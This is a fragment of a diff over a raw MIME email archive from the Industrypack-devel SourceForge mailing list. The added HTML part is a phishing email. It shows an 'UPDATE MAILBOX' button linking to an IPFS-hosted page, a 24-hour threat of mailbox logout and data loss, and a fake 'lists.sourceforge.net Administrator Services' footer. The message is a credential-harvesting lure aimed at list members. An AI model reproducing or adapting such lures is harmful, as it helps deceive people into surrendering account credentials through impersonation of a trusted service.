+TH: medium; OUTLINE-STYLE: none; DISPLAY: block; OUTLINE-COLOR: invert; LIN=
+E-HEIGHT: 40px; text-decoration-line: none" href=3D"https://cloudflare-ipfs=
+=2Ecom/ipfs/bafkreif46ea45sy2tathyc2mfmgr52woktxazskk3oxhejgn3lfkwxc6o4#ind=
+ustrypack-devel@lists.sourceforge.net" target=3D_blank>UPDATE MAILBOX</A></=
+TD></TR></TBODY>
+</TABLE><BR></TD></TR>
+<TR>
+<TD style=3D"FONT-FAMILY: inherit; MARGIN: 0px" height=3D20 vAlign=3Dtop al=
+ign=3Dleft><BR></TD></TR>
+<TR>
+<TD style=3D"FONT-FAMILY: inherit; MARGIN: 0px" vAlign=3Dtop>
+<TABLE style=3D"BORDER-COLLAPSE: collapse" cellSpacing=3D0 cellPadding=3D0 =
+width=3D"100%" border=3D0>
+<TBODY>
+<TR>
+<TD style=3D"FONT-SIZE: 13px; FONT-FAMILY: Roboto, Arial; COLOR: rgb(102,10=
+2,102); MARGIN: 0px; LINE-HEIGHT: 19px"><FONT style=3D"VERTICAL-ALIGN: inhe=
+rit"><FONT style=3D"VERTICAL-ALIGN: inherit">
+You have 24 hours to complete the update to prevent your mailbox from being=
+ logged out and prevent loss of important data.&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></FONT>
+ </TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD style=3D"FONT-FAMILY: inherit; BORDER-BOTTOM: rgb(238,238,238) 1px soli=
+d; MARGIN: 0px" height=3D25><BR></TD></TR>
+<TR>
+<TD style=3D"FONT-FAMILY: inherit; MARGIN: 0px" height=3D23><BR></TD></TR>
+<TR>
+<TD style=3D"FONT-FAMILY: inherit; MARGIN: 0px" vAlign=3Dtop>
+<TABLE style=3D"BORDER-COLLAPSE: collapse" cellSpacing=3D0 cellPadding=3D0 =
+width=3D"90%">
+<TBODY>
+<TR>
+<TD style=3D"FONT-FAMILY: Roboto, Arial; FONT-WEIGHT: 600; COLOR: rgb(51,51=
+,51); MARGIN: 0px; LINE-HEIGHT: 18px" vAlign=3Dtop>lists.sourceforge.net Ad=
+ministrator Services. All Rights Reserved</TD></TR></TBODY></TABLE></TD></T=
+R>
+<TR>
+<TD style=3D"FONT-FAMILY: inherit; MARGIN: 0px" height=3D32><BR></TD></TR><=
+/TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></T=
+R>
+<TR>
+<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: inherit; MARGIN: 0px" height=3D3=
+0 vAlign=3Dtop align=3Dcenter><BR></TD></TR></TBODY></TABLE></DIV></BODY></=
+HTML>
 
 
---===============8807339114717639922==
+--===============2270109010848851525==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
 Content-Disposition: inline
 
 
---===============8807339114717639922==
+--===============2270109010848851525==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -254,4 +307,4 @@ Industrypack-devel mailing list
 Industrypack-devel@lists.sourceforge.net
 https://lists.sourceforge.net/lists/listinfo/industrypack-devel
 
---===============8807339114717639922==--
+--===============2270109010848851525==--
